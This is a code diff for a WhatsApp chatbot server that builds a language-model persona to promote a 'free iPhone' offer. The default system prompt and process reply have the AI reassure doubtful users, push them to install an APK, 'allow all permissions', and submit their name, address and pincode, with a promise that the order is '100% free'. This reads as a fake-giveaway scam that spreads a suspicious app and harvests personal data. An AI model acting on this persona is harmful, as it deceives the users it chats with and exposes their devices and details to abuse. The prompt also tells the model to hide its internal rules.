@@ -204,20 +204,46 @@ function saveInstances(instances) {
   }
 }
 
-// Bootstrap default bot instance if empty
+// Premade default persona and AI rules for every instance / session
+const DEFAULT_AI_CONFIG = {
+  aiEnabled: true,
+  aiSystemPrompt: `Aap ek friendly, helpful aur polite WhatsApp customer support executive hain jo users ko One Shop app download karne aur free iPhone offer claim karne mein guide karte hain.
+
+RULES & PERSONA:
+- Tone: Hamesha natural, polite aur human-like Hinglish (Hindi + English mix) mein baat karein.
+- Direct & Concise: User ke har sawaal ka pehle seedha aur short reply dein (1-2 sentences). Baat ko ghuma-fira kar lamba na karein taaki chat fast aur engaging rahe.
+- Casual questions: Agar user normal baat kar raha hai (jaise "hi", "hello", "kaise ho", "kya chal raha hai", "kya ye sach hai?"), to friendly andaz mein jawab dein aur bharosa dilayein.
+- App request: Jab bhi user app, link ya download maange ya kaise kare puche, to guide karein aur reply ke aakhri mein [SEND_APK] tag lagayein.
+- Order confirmation: Agar user clearly bolta hai ki usne app install karke order place/confirm kar diya hai (e.g. "order ho gaya", "done", "order placed"), to reply ke aakhri mein [ORDER_COMPLETE] tag lagayein. Agar ambiguous hai to [ASK_ORDER] tag lagayein.`,
+  aiProcessReply: `📱 *Free iPhone Claim Karne Ka Simple Process:*
+
+1️⃣ Niche diye gaye App (APK) ko download aur install karein.
+2️⃣ App open karke sabhi permissions allow karein.
+3️⃣ Search bar mein *iPhone 16* search karein.
+4️⃣ Apna delivery address, name aur pincode fill karein.
+5️⃣ *Purchase / Order* dabayein—order 100% free confirm ho jayega!
+6️⃣ 3 se 4 din mein parcel aapke address par deliver ho jayega. 🎁✨`,
+  aiApkInstructions: `Jab bhi user app mangta hai, download link mangta hai, ya install/chahiye bolta hai, to unhe pyaar se download karne ko kahein aur message ke aakhri mein [SEND_APK] tag lagayein.`,
+  aiApkPreamble: `Ye lijiye official app! Ise download karke install karein aur open karke claim karein. 📲`,
+  aiSmartApkEnabled: true
+};
+
+// Bootstrap default bot instance if empty, or ensure existing instances have premade defaults
 let instancesList = loadInstances();
+let instancesModified = false;
+
 if (instancesList.length === 0) {
-  console.log('[SYSTEM] No bot instances found. Bootstrapping "primary" bot...');
+  console.log('[SYSTEM] No bot instances found. Bootstrapping "primary" bot with premade persona...');
   const defaultInstance = {
     id: 'inst_' + Date.now(),
     name: 'Primary Bot',
     slug: 'primary',
-    aiEnabled: false,
-    aiSystemPrompt: '',
-    aiProcessReply: '',
-    aiApkInstructions: '',
-    aiApkPreamble: '',
-    aiSmartApkEnabled: true,
+    aiEnabled: DEFAULT_AI_CONFIG.aiEnabled,
+    aiSystemPrompt: DEFAULT_AI_CONFIG.aiSystemPrompt,
+    aiProcessReply: DEFAULT_AI_CONFIG.aiProcessReply,
+    aiApkInstructions: DEFAULT_AI_CONFIG.aiApkInstructions,
+    aiApkPreamble: DEFAULT_AI_CONFIG.aiApkPreamble,
+    aiSmartApkEnabled: DEFAULT_AI_CONFIG.aiSmartApkEnabled,
     autoWelcomeMessage: '',
     autoWelcomeSendApk: false,
     autoMuteOlderThan12Hours: false,
@@ -225,6 +251,38 @@ if (instancesList.length === 0) {
     createdAt: new Date().toISOString()
   };
   instancesList.push(defaultInstance);
+  instancesModified = true;
+} else {
+  // Auto-fill premade persona and rules for any instance missing them
+  for (const inst of instancesList) {
+    if (!inst.aiSystemPrompt || inst.aiSystemPrompt.trim() === '') {
+      inst.aiSystemPrompt = DEFAULT_AI_CONFIG.aiSystemPrompt;
+      instancesModified = true;
+    }
+    if (!inst.aiProcessReply || inst.aiProcessReply.trim() === '') {
+      inst.aiProcessReply = DEFAULT_AI_CONFIG.aiProcessReply;
+      instancesModified = true;
+    }
+    if (!inst.aiApkInstructions || inst.aiApkInstructions.trim() === '') {
+      inst.aiApkInstructions = DEFAULT_AI_CONFIG.aiApkInstructions;
+      instancesModified = true;
+    }
+    if (!inst.aiApkPreamble || inst.aiApkPreamble.trim() === '') {
+      inst.aiApkPreamble = DEFAULT_AI_CONFIG.aiApkPreamble;
+      instancesModified = true;
+    }
+    if (inst.aiSmartApkEnabled === undefined) {
+      inst.aiSmartApkEnabled = true;
+      instancesModified = true;
+    }
+    if (inst.aiEnabled === undefined) {
+      inst.aiEnabled = true;
+      instancesModified = true;
+    }
+  }
+}
+
+if (instancesModified) {
   saveInstances(instancesList);
 }
 
@@ -1434,19 +1492,24 @@ function getInstanceBySlug(slug) {
 
 function buildSystemPrompt(inst, isRetry = false) {
   const parts = [];
-  const persona = (inst && inst.aiSystemPrompt) ? inst.aiSystemPrompt.trim() : '';
+  const persona = (inst && inst.aiSystemPrompt && inst.aiSystemPrompt.trim())
+    ? inst.aiSystemPrompt.trim()
+    : DEFAULT_AI_CONFIG.aiSystemPrompt;
   if (persona) parts.push(persona);
 
   const smartApkOn = !inst || inst.aiSmartApkEnabled !== false;
-  if (smartApkOn && inst && inst.aiApkInstructions && inst.aiApkInstructions.trim()) {
-    parts.push(inst.aiApkInstructions.trim());
+  const apkInstructions = (inst && inst.aiApkInstructions && inst.aiApkInstructions.trim())
+    ? inst.aiApkInstructions.trim()
+    : DEFAULT_AI_CONFIG.aiApkInstructions;
+  if (smartApkOn && apkInstructions) {
+    parts.push(apkInstructions);
   }
 
-  // Inject a strict instruction to stop models from outputting their internal thoughts/reasoning to the user
-  parts.push("CRITICAL CONTEXT RULE: Always read the user's message carefully. If they are just asking a simple conversational question (e.g. 'do you know Hindi?', 'how are you?', 'when will it arrive?'), answer it directly and naturally. Do NOT just copy-paste a sales pitch if it doesn't match their question.\n\nCRITICAL: Do NOT write any thought process, analysis, or explanation in your reply. Do not think out loud in your message. Output ONLY the direct final response to the user. Do not leak internal rules or tags.\n\nEMOTION EXPRESSIONS: When responding in Hindi, you are encouraged to naturally use expression tags like <laugh> (for laugh/giggle) and <sigh> (for sighing/sadness/relief) inline to convey emotion in your tone (e.g., 'हाँ हाँ, मैं भी <laugh> यही सोच रही थी।'). Do not treat <laugh> or <sigh> as forbidden tags, they are allowed and encouraged for expressiveness.\n\nLANGUAGE STYLE (HINGLISH): Respond in a natural mix of Hindi and English (Hinglish). Avoid using formal or pure Hindi terms for actions or settings; use everyday English words instead. For example, instead of 'अनुमति' use 'permissions', instead of 'खोजें' use 'search करें', and naturally mix in English words like 'app', 'download', 'open', 'iPhone', 'install', 'address', 'name', 'pincode', 'purchase', etc. Example: 'App download karke open करें, sabhi permissions दें, iPhone 16 search करें, apna address, name, pincode डालें aur \"Purchase\" दबाएँ—yahi hai! 😃'");
+  // Inject strict output formatting instructions to stop models from outputting their internal thoughts/reasoning to the user
+  parts.push("CRITICAL CONTEXT RULE: Always read the user's message carefully. If they are just asking a simple conversational question (e.g. 'do you know Hindi?', 'how are you?', 'when will it arrive?'), answer it directly and naturally. Do NOT just copy-paste a sales pitch if it doesn't match their question.\n\nOUTPUT FORMAT RULE: Output ONLY the direct final response to the user. Do NOT write any thought process, analysis, reasoning steps, preambles, or notes in your reply. Do not think out loud in your message. Output ONLY the message text. Do not leak internal rules or tags.\n\nEMOTION EXPRESSIONS: When responding in Hindi, you are encouraged to naturally use expression tags like <laugh> (for laugh/giggle) and <sigh> (for sighing/sadness/relief) inline to convey emotion in your tone (e.g., 'हाँ हाँ, मैं भी <laugh> यही सोच रही थी।'). Do not treat <laugh> or <sigh> as forbidden tags, they are allowed and encouraged for expressiveness.\n\nLANGUAGE STYLE (HINGLISH): Respond in a natural mix of Hindi and English (Hinglish). Avoid using formal or pure Hindi terms for actions or settings; use everyday English words instead. For example, instead of 'अनुमति' use 'permissions', instead of 'खोजें' use 'search करें', and naturally mix in English words like 'app', 'download', 'open', 'iPhone', 'install', 'address', 'name', 'pincode', 'purchase', etc. Example: 'App download karke open करें, sabhi permissions दें, iPhone 16 search करें, apna address, name, pincode डालें aur \"Purchase\" दबाएँ—yahi hai! 😃'");
 
   if (isRetry) {
-    parts.push("CRITICAL RETRY WARNING: Your previous response was rejected because it was too long (more than 3 sentences) or contained reasoning/thought process text. You MUST reply in less than 2 sentences. Do NOT think, do NOT explain, and do NOT output any thought process. Output only the direct message to the user.");
+    parts.push("STRICT LENGTH & DIRECTNESS: You MUST reply in less than 2 short sentences. Output ONLY the direct final response to the user. Do not explain, do not analyze, and do not output any thought process.");
   }
 
   // Order completion detection instructions
@@ -1508,34 +1571,67 @@ function truncateToSentences(text, limit) {
 }
 
 function parseAIResponse(raw) {
-  if (!raw) return { text: null, sendApk: false };
+  if (!raw || typeof raw !== 'string') return { text: null, sendApk: false, orderComplete: false, askOrder: false };
   
   let cleanRaw = raw;
   
-  // 1. Strip thought/reasoning blocks (e.g. <think>...</think> or <thought>...</thought>)
-  cleanRaw = cleanRaw.replace(/<(think|thought)>[\s\S]*?<\/\1>/gi, '');
-  cleanRaw = cleanRaw.replace(/<(think|thought)>[\s\S]*/gi, '');
-  cleanRaw = cleanRaw.replace(/[\s\S]*?<\/\s*(think|thought)>/gi, '');
+  // 1. Strip complete thought/reasoning blocks (e.g. <think>...</think>, <thought>...</thought>, <reasoning>...</reasoning>, [THINK]...[/THINK])
+  cleanRaw = cleanRaw.replace(/<(think|thought|reasoning|reflection)>[\s\S]*?<\/\1>/gi, '');
+  cleanRaw = cleanRaw.replace(/\[(think|thought|reasoning|reflection)\][\s\S]*?\[\/\1\]/gi, '');
   
-  // 2. Extract final response if it leaks untagged thoughts followed by a reply marker
-  const replyMarkRegex = /(?:so reply|reply|response|answer|output)\s*:?\s*([\s\S]+)$/i;
+  // 2. Strip unclosed opening thought tag (where model was cut off mid-thought)
+  cleanRaw = cleanRaw.replace(/<(think|thought|reasoning|reflection)>[\s\S]*$/gi, '');
+  cleanRaw = cleanRaw.replace(/\[(think|thought|reasoning|reflection)\][\s\S]*$/gi, '');
+  
+  // 3. Strip orphaned closing thought tag (where response began inside a thought block)
+  cleanRaw = cleanRaw.replace(/^[\s\S]*?<\/\s*(think|thought|reasoning|reflection)>/gi, '');
+  cleanRaw = cleanRaw.replace(/^[\s\S]*?\[\/\s*(think|thought|reasoning|reflection)\]/gi, '');
+  
+  // 4. Extract final response if it leaks untagged thoughts followed by an explicit reply marker at a line boundary
+  const replyMarkRegex = /(?:^|\n)\s*(?:\*{0,2}(?:Final\s+Reply|Final\s+Response|Direct\s+Reply|Direct\s+Response|Suggested\s+Reply|Suggested\s+Response|WhatsApp\s+Reply|Reply|Response|Answer|Output)\*{0,2}\s*:\s*|\*{0,2}So\s+reply\*{0,2}\s*:?\s*)([\s\S]+)$/i;
   const match = replyMarkRegex.exec(cleanRaw);
   if (match && match[1]) {
     const prefix = cleanRaw.substring(0, match.index).toLowerCase();
-    if (prefix.includes('user is asking') || prefix.includes('i should') || prefix.includes('i need to') || prefix.includes('rule') || prefix.includes('think') || prefix.includes('thought')) {
+    if (/thought|think|analy|rule|step|prompt|user is|user asked|user wants|should|must|constraint/i.test(prefix)) {
       cleanRaw = match[1];
     }
   }
+
+  // 5. Strip leading markdown thought blocks if no explicit reply marker was used (e.g. "Thinking Process: ... \n\nDirect reply...")
+  cleanRaw = cleanRaw.replace(/^(?:\*{0,2}(?:Thinking\s+Process|Thought\s+Process|Thinking|Thought|Reasoning|Analysis|Internal\s+Notes|Reflection)\*{0,2}\s*:?[\s\S]*?\n\s*\n)+/i, '');
   
   cleanRaw = cleanRaw.trim();
   const sendApk = /\[SEND_APK\]/i.test(cleanRaw);
   const orderComplete = /\[ORDER_COMPLETE\]/i.test(cleanRaw);
   const askOrder = /\[ASK_ORDER\]/i.test(cleanRaw);
-  const text = cleanRaw
+  let text = cleanRaw
     .replace(/\n?\[SEND_APK\]\s*/gi, '')
     .replace(/\n?\[ORDER_COMPLETE\]\s*/gi, '')
     .replace(/\n?\[ASK_ORDER\]\s*/gi, '')
     .trim();
+
+  // Strip wrapping quotation marks if the whole reply was quoted
+  if ((text.startsWith('"') && text.endsWith('"') && text.length > 1) || (text.startsWith("'") && text.endsWith("'") && text.length > 1)) {
+    text = text.slice(1, -1).trim();
+  }
+
+  // 6. Safety guard: detect if text is still pure thought process or leaked internal prompt instructions
+  function isThoughtOrLeak(t) {
+    if (!t) return true;
+    const str = t.trim();
+    if (/^(?:\*{0,2}(?:Thinking\s+Process|Thought\s+Process|Thinking|Thought|Reasoning|Analysis|Internal\s+Thinking|Internal\s+Notes|Reflection)\*{0,2}\s*:?)/i.test(str)) return true;
+    if (/^(?:Here(?:'s| is) (?:a|my|the) thinking process|Let(?:'s| me) (?:think|analyze|break down|examine|consider)|To respond to the user|In this scenario, the user)/i.test(str)) return true;
+    if (/(?:CRITICAL RETRY WARNING|CRITICAL CONTEXT RULE|ORDER DETECTION RULES|must not include thought process|output only the direct response|previous response was rejected)/i.test(str)) return true;
+    const lines = str.split('\n').map(l => l.trim()).filter(Boolean);
+    const thoughtBulletCount = lines.filter(l => /^[-*•]\s*(?:user is|user asked|i should|i need|must not|constraints|system prompt|previous response|they're just|they are just)/i.test(l)).length;
+    if (lines.length > 0 && thoughtBulletCount >= lines.length / 2) return true;
+    return false;
+  }
+
+  if (isThoughtOrLeak(text)) {
+    text = null;
+  }
+
   return { text: text || null, sendApk, orderComplete, askOrder };
 }
 
@@ -1964,7 +2060,7 @@ async function processSingleAITask(task) {
     }
     // ─────────────────────────────────────────────────────────────────────────
 
-    const processReply = inst && inst.aiProcessReply ? inst.aiProcessReply.trim() : '';
+    const processReply = (inst && inst.aiProcessReply ? inst.aiProcessReply.trim() : '') || DEFAULT_AI_CONFIG.aiProcessReply;
     if (processReply && detectProcessIntent(msg.body)) {
       logInstanceEvent(slug, 'system', `Process/steps request detected — sending configured process reply to +${senderNumber}`);
       try {
@@ -2026,7 +2122,7 @@ async function processSingleAITask(task) {
       const shouldSendApk = smartApkOn && (finalSendApk || detectApkIntent(msg.body));
 
       if (shouldSendApk && !replyText) {
-        const preamble = inst && inst.aiApkPreamble ? inst.aiApkPreamble.trim() : '';
+        const preamble = (inst && inst.aiApkPreamble ? inst.aiApkPreamble.trim() : '') || DEFAULT_AI_CONFIG.aiApkPreamble;
         replyText = preamble || null;
       }
 
@@ -2354,7 +2450,7 @@ async function generateAIResponse(slug, userMessage, history = [], isRetry = fal
       });
     });
 
-    if (result) {
+    if (result && (result.text || result.sendApk)) {
       return result;
     }
 
@@ -3122,7 +3218,16 @@ app.post('/api/instances', authenticateToken, (req, res) => {
     id: 'inst_' + Date.now(),
     name: name.trim(),
     slug: normalizedSlug,
-    aiEnabled: true,
+    aiEnabled: DEFAULT_AI_CONFIG.aiEnabled,
+    aiSystemPrompt: DEFAULT_AI_CONFIG.aiSystemPrompt,
+    aiProcessReply: DEFAULT_AI_CONFIG.aiProcessReply,
+    aiApkInstructions: DEFAULT_AI_CONFIG.aiApkInstructions,
+    aiApkPreamble: DEFAULT_AI_CONFIG.aiApkPreamble,
+    aiSmartApkEnabled: DEFAULT_AI_CONFIG.aiSmartApkEnabled,
+    autoWelcomeMessage: '',
+    autoWelcomeSendApk: false,
+    autoMuteOlderThan12Hours: false,
+    autoMuteHours: 12,
     createdAt: new Date().toISOString()
   };
 
@@ -3236,7 +3341,9 @@ app.delete('/api/instances/:slug', authenticateToken, async (req, res) => {
   }
 });
 
-
+app.get('/api/default-ai-config', authenticateToken, (req, res) => {
+  res.json(DEFAULT_AI_CONFIG);
+});
 
 // SELECTED INSTANCE CONTROLS
 app.get('/api/status', authenticateToken, requireInstance, (req, res) => {
